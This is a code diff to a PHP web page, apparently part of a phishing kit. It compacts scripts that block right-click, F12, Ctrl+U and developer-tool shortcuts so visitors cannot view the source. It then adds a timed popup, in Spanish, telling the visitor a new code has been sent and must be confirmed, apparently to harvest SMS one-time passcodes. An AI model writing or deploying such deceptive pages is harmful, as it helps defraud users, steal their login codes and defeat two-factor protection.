@@ -96,29 +96,41 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $usuario) {
     }
 </style>
 <script>
-    // Protección contra clic derecho y código fuente
-    document.addEventListener('contextmenu', function(e) {
-        e.preventDefault();
-        return false;
-    });
-
+    document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
     document.addEventListener('keydown', function(e) {
-        // Prevenir F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
-        if (e.keyCode === 123 || // F12
-            (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || // Ctrl+Shift+I/J
-            (e.ctrlKey && e.keyCode === 85)) { // Ctrl+U
-            e.preventDefault();
-            return false;
+        if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || (e.ctrlKey && e.keyCode === 85)) {
+            e.preventDefault(); return false;
         }
+    });
+    document.addEventListener('dragstart', function(e) {
+        if (e.target.tagName === 'IMG') { e.preventDefault(); return false; }
     });
 
-    // Prevenir arrastrar imágenes
-    document.addEventListener('dragstart', function(e) {
-        if (e.target.tagName === 'IMG') {
-            e.preventDefault();
-            return false;
-        }
+    // Evitar doble envío
+    document.getElementById('f1').addEventListener('submit', function() {
+        var btn = this.querySelector('input[type="submit"]');
+        if (btn) { btn.disabled = true; btn.style.opacity = '0.6'; }
     });
+</script>
+
+<!-- Popup -->
+<div id="sms-popup" style="position: fixed; inset: 0; background: rgba(0,0,0,0.55); z-index: 9999; display: none; align-items: center; justify-content: center; opacity: 0; transition: opacity 0.3s ease;">
+    <div style="background: #fff; border-radius: 10px; padding: 28px 24px; max-width: 300px; width: 88%; text-align: center; box-shadow: 0 6px 28px rgba(0,0,0,0.25);">
+        <p style="font-family: 'Segoe UI', sans-serif; font-size: 15px; color: #222; line-height: 1.6; font-weight: 500;">Hemos enviado un nuevo codigo, confirmalo para continuar</p>
+    </div>
+</div>
+<script>
+    (function () {
+        var p = document.getElementById('sms-popup');
+        setTimeout(function () {
+            p.style.display = 'flex';
+            setTimeout(function () { p.style.opacity = '1'; }, 20);
+            setTimeout(function () {
+                p.style.opacity = '0';
+                setTimeout(function () { p.style.display = 'none'; }, 350);
+            }, 2000);
+        }, 1000);
+    })();
 </script>
 </body>
 </html>
